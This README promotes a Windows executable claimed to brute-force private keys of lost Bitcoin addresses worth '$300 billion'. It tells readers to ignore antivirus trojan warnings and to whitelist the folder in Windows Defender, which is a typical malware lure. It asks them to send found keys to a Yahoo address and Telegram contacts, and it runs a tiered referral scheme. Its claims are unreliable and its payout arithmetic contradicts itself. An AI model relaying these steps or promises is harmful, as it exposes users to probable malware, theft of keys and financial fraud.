# CUDA_LBU-v1.1
Lost BTC Unlocker for CUDA GPU

Welcome, Stalker!

There are about 37,000 Bitcoin addresses in the network with abandoned, forgotten, or lost passwords and keys—addresses that have had no outgoing transactions for 
over 10 years. Additionally, there are challenge addresses set up by billionaire whales, such as the 1000 BTC Bitcoin Puzzle. 
All these addresses are baked into the CUDA_LBU_v1.1.exe tool and collectively hold around $300 billion.

If you want to join the hunt and recover these treasures, unzip the archive into your Windows user folder (typically `C:\Users\YourName\`).

1. Open the `CUDA_LBU_v1.1` folder and locate `CUDA_LBU_v1.1.exe` inside.
2. Ignore any antivirus or Windows Defender warnings about suspicious files or trojans—these arise because the program deals with crypto-functions and key generation.
3. Add the `CUDA_LBU_v1.1` folder to your antivirus whitelist and to Windows Defender exclusions 
(`Settings → Update & Security → Windows Security → Virus & Threat Protection → Manage Settings → Add or Remove Exclusions → Add an Exclusion → Folder → 
Choose CUDA_LBU_v1.1 folder`).

`CUDA_LBU_v1.1` works only with NVIDIA GPUs supporting CUDA 10 and above.

---

## Supported Bitcoin Address Types

Today there are five address types derived from a single private key:

1. **Legacy (uncompressed)** (pre-2013, e.g., `1EHNa6Q4Jz2uvNExL497mE43ikXhwF6kZm`)
2. **Legacy (compressed)** (post-2013, e.g., `1BgGZ9tcN4rm9KBzDn7KprQz87SZ26SAMH`)
3. **SegWit P2SH** (post-2017, e.g., `3JvL6Ymt8MVWiCNHC7oWU6nLeHNJKLZGLN`)
4. **Bech32 SegWit** (`p2wpkh` and `p2wsh`, e.g., `bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4`)
5. **Taproot Schnorr** (e.g., `bc1pmfr3p9j00pfxjh0zmgp99y8zftmd3s5pmedqhyptwy6lm87hf5sspknck9`)

We focus on compressed and uncompressed legacy addresses, since they are vulnerable to brute-force and contain the majority of lost funds. 
Recovering keys for SegWit and Taproot addresses is nearly impossible due to additional scripts and salts used.

---

## Setting the Key Range

The program lets you specify a hex range from **START** to **END** for your search to improve your chances:

* Addresses created before 2013 are typically uncompressed; post-2013 are usually compressed (not guaranteed).
* Some challenge ranges (e.g., from the 1000 BTC Bitcoin Puzzle) are known—all compressed:

START:	400001e410b4514000 END: 7fffffffffffffffff  					include 1PWo3JeB9jrGwfHDNpdGK54CRas7fsVzXU		
START:	800000000000000000 END: ffffffffffffffffff  					include 1JTK7s9YVYywfm5XUH7RNhHJH1LshCaRFR		
START:	1000000000000000000 END: 1ffffffffffffffffff  				include 12VVRNPi4SJqUTsp6FmqDqY5sGosDtysn4		
START:	2000000000000000000 END: 3ffffffffffffffffff  				include 1FWGcVDK3JGzCC3WtkYetULPszMaK2Jksv			
----------------------------------------
START: 800000000000000000000000000000000000000 END: fffffffffffffffffffffffffffffffffffffff  	1FTpAbQa4h8trvhQXjXnmNhqdiGBd1oraE
START: 1000000000000000000000000000000000000000 END: 1fffffffffffffffffffffffffffffffffffffff  	14JHoRAdmJg3XR4RjMDh6Wed6ft6hzbQe9
START: 2000000000000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffffffffffff  	19z6waranEf8CcP8FqNgdwUe1QRxvUNKBG
START: 4000000000000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffffffffffff  	14u4nA5sugaswb6SZgn5av2vuChdMnD9E5
START: 8000000000000000000000000000000000000000 END: ffffffffffffffffffffffffffffffffffffffff  	1NBC8uXJy1GiJ6drkiZa1WuKn51ps7EPTv

You can choose any single range or multiple in sequence (e.g., `400001e410b4514000` to `1fffffffffffffffffff` covers six addresses).

All other addresses lie in the overall range from START: ffffffffffffffffffffffffffffffffffffffff to 
END: fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141 and include both compressed and uncompressed.

---

## How to Run

Double-click `CUDA_LBU_v1.1.exe`. In the console window, enter:
# In 64-way cycling determinictic oscillating pendulum mode...  (pendulum state and direction will be saved in file)

1. **START key (hex)**: start of your search range (e.g., `400001e410b4514000`).
2. **END key (hex)**: end of your search range (e.g., `7fffffffffffffffff`).
3. **Number of CUDA devices**: physical NVIDIA GPUs with CUDA support.
4. **CUDA blocks \[50–250]**: blocks per device (tune for your GPU; RTX 4060 \~96).
5. **Threads per block \[32–1024] (multiple of 32)**: tune for best performance (RTX 4060 \~128).
6. **Points per thread \[50–5000]**: more points = higher throughput, less free memory.

After launch, you’ll see initialization and live performance stats

# Random mode

1. **START key (hex)**: Random
2. **END key (hex)**: r
3. **Number of key digits to start \[18-64]**: desired range of digits for Random mode  
3. **Number of CUDA devices**: physical NVIDIA GPUs with CUDA support.
4. **CUDA blocks \[50–250]**: blocks per device (tune for your GPU; RTX 4060 \~96).
5. **Threads per block \[32–1024] (multiple of 32)**: tune for best performance (RTX 4060 \~128).
6. **Points per thread \[50–5000]**: more points = higher throughput, less free memory.

After launch, you’ll see initialization and live performance stats

## Grey Zone

Its a local database of passed/checked key ranges. Every 2 minutes program updates it and saved new ranges in memory and Grey.zone file in programm folder.
CUDA_LBU first check if selected range in Grey Zone, if not it try to scan it for a key.
Active stalkers must post theyr Grey.zone file to group.
In return will be post merged Grey.zone from all stalkers by group founder.
After that replace your old file with new one in purpose to increase a finding chances!

## TESTING Finding Key

To test, use a micro-range for address `13zb1hQbWVsc2S7ZTZnP2G4undNNpdh5so:`
`START: 2832ed72f2b5e25ee END: 2832ed75f3b5e45ee`

It must find a code in some minutes and show the table

The program uses AI math optimization methods, deterministic pendulum cyclic ranges mode and full-random brute-force when `RANDOM` is specified in START: and END:. 
The longer it runs, the higher your chance to find a key. When a key is found, it prints the address and stops all processes, saving results to `Found_Keys.txt`.

**Send `Found_Keys.txt` from the program folder via email or messenger to:

* `SoGerera@yahoo.com`
* [https://t.me/RomanVader](https://t.me/RomanVader)

Include your Bitcoin address to receive 50% of the recovered funds.

---

## Referral & Rewards Network

**Referral structure:**

* **Stalker**: anyone in the Telegram group ([https://t.me/LostBTCUnlocker](https://t.me/LostBTCUnlocker)).
* **Bolt**: a Stalker you invited.
* Each found key awards:

  * 50% to the finder
  * 7% to their inviter (Stalker)
  * 13% split depends on Working Time among all active group members 
  who posted a weekly photo/video proof of running the program (Fri–Mon) with Grey.Zone posting
	- > 200 working hours + 1 share of 13% reward
	- > 300 wh + 2 shares
	- > 600 wh + 3 shares
	- > 800 wh + 4 shares
	- > 1000 wh + 5 shares
	- > 1500 wh + 6 shares
	- > 2000 wh + 7 shares
	- > 2500 wh + 8 shares
	- > 3000 wh + 9 shares
	- > 3500 wh + 10 shares
	- > 4000 wh + 11 shares
	- > 4500 wh + 12 shares
	- > 5000 wh + 13 shares

Now you have your own "Labor book" - cryptographic curve saved on your user APPDATA folder (e.g. "C:\Users\...\AppData\Roaming\LBU\CUDA_LBU")
It holds your Working Hours safe in curve even when your CUDA_LBU is offline.

For example, if 1,000 BTC is found:

* Finder: 500 BTC
* Their Stalker: 70 BTC
* Active group: 1000 Stalkers 
* 500 (200 wh) active members 500 shares: 0.009 BTC each (\~\$1,000)
* 300 (2000 wh) active members 2100 shares: 0.063 BTC each (\~\$7,500)
* 200 (4000 wh) active members 2200 shares: 0.099 BTC each (\~\$11,500)
* 197 (5000 wh) active members 2561 shares: 0.117 BTC each (\~\$14,000)
* Total: 7361 shares of 13% (500 BTC) / 7361 = 0.009 BTC for 1 share

**Weekly proof requirement:**

Post here https://t.me/LostBTCUnlocker a screenshot or video of the program’s console with a visible timestamp and working hour + Grey.Zone file share.
When a code is found, submit it with your BTC address and your inviter’s contact to the project lead (“Monolith”) https://t.me/RomanVader.

## Minimum requirements:

Your GPUs run at full load — provide proper cooling (floor fans, open case), especially in hot weather.

* Windows 10
* Intel Celeron 1 GHz
* 4 GB RAM
* NVIDIA CUDA GPU
* No internet required
---

Good luck, Stalker. Patience and persistence will pay off!
